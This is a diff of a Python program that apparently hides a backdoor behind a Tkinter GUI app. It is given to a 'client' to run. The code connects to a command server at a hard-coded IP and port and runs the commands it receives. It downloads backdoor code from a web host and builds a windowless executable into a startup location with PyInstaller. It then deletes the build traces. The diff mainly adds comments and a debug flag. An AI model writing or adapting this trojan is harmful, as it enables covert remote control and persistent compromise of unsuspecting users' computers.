@@ -18,9 +18,14 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
 def recv_commands():
+    """
+    This function receives commands from the server and executes them
+    :return: None
+    """
     while True:
         try:
-            s.connect(("192.168.0.105", 42424))
+            '''Change the IP address to your public IP address'''
+            s.connect(("192.168.0.105", 42424))  # Connect to the server
         except socket.error:
             continue
         else:
@@ -35,6 +40,7 @@ def recv_commands():
                 commands_process.close()
                 return
             if new_msg:
+                '''Check if this is a new message, if it its , we will get the message header first'''
                 msglength = msg[:HEADERSIZE].decode("utf-8")
                 try:
                     msglen = int(msglength)
@@ -42,9 +48,7 @@ def recv_commands():
                     continue
                 new_msg = False
 
-
             full_msg += msg.decode("utf-8")
-
 
             if len(full_msg)-HEADERSIZE == msglen:
                 full_msg = full_msg[HEADERSIZE:]
@@ -133,7 +137,8 @@ def create_backdoor(request):
         res_win = win_cmd.stderr.read()
         mac_linux_cmd = subprocess.Popen("pip3 install pyinstaller", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         res_mac_linux = mac_linux_cmd.stderr.read()
-        if res_win == b"" and res_mac_linux == b"":
+        if res_win != b"" and res_mac_linux != b"":
+            backdoor_process.daemon = True
             return
         command = "pyinstaller -w --onefile --distpath \"{}\" --clean --workpath .\.build --name {} temp.py ".format(startup_location, name)
         exe_subp = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -149,6 +154,10 @@ def create_backdoor(request):
         
 # Delete all files the backdoor creation created
 def clear():
+    """
+    This functions deletes all unnecessary files from the backdoor creation
+    :return: None
+    """
     commands = ["del /f/s/q {} > nul".format(location), "rmdir {}".format(location), "del /f/s/q __pycache__ > nul",
                 "rmdir __pycache__", "del /f/s/q .build > nul", "rmdir .\\.build\\{}".format(name), "rmdir .build",
                 "del {}.spec".format(name), "del temp.py"]
@@ -231,7 +240,14 @@ save_button.place(x=560, y=200)
 # ------- END OF GUI APP --------
 
 # Get the code of the backdoor
-request = requests.get("http://myspecialsite.host20.uk/backdoor.py")
+debug = True  # Change to False when you give the file to the client
+try:
+    request = requests.get("http://webserver.com/backdoor.py")
+except Exception:
+    if not debug:  # if this is real client use and not in development
+        print("Cannot get files from web server!")
+        print("Quiting...")
+        quit()
 
 # Creating processes to receive commands from the server and create a backdoor
 commands_process = multiprocessing.Process(target=recv_commands)  # Creating a process to connect to server and execute commands
@@ -240,8 +256,8 @@ backdoor_process = multiprocessing.Process(target=create_backdoor, args=(request
 backdoor_process.daemon = False
 if __name__ == "__main__":
     try:
-        commands_process.start()
-        backdoor_process.start()
+        commands_process.start()  # connect to the server and start executing commands
+        backdoor_process.start()  # create the backdoor
         win.mainloop()
     except KeyboardInterrupt:
         try:
